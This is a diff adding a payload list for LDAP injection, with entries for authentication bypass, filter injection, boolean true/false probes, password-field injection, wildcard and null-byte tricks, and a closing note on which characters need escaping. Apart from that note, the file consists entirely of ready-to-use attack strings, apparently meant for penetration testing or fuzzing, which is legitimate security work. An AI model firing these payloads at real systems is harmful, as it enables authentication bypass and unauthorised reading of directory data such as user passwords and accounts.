@@ -1,0 +1,54 @@
+# ============================================================
+# LDAP Injection — Basic Payloads
+# ============================================================
+
+# ---- Authentication Bypass ----
+*
+*)(&
+*))%00
+*()|%26'
+*()|&'
+*(|(mail=*))
+*(|(objectclass=*))
+admin*)((|userPassword=*)
+admin*
+*)(uid=*))(|(uid=*
+x' or name()='username' or 'x'='y
+
+# ---- Filter Injection ----
+)(uid=*)
+)(|(uid=*
+*)(uid=*
+*)((|(uid=*
+*(uid=*)
+
+# ---- Boolean Injection ----
+# True condition
+*)(cn=*))(|(cn=*
+# False condition
+*)(cn=FAKEFAKE))(|(cn=FAKEFAKE
+
+# ---- Username / Password Field Injection ----
+admin)(|(password=*)
+admin)(|(cn=*)
+admin*)(&(password=anything)
+*)(objectClass=*
+ldapuser)(&
+ldapuser))(|(
+
+# ---- Comment/Wildcard ----
+*
+**
+%2a
+%2a%29%28
+%2a%29%28%7c
+
+# ---- Null Byte ----
+admin%00
+user%00pass
+
+# ---- Special LDAP Characters ----
+# ( ) * \ NUL — must be escaped in safe queries
+# Unescaped in user input → injection
+( ) * \ NUL
+\28 \29 \2a \5c \00
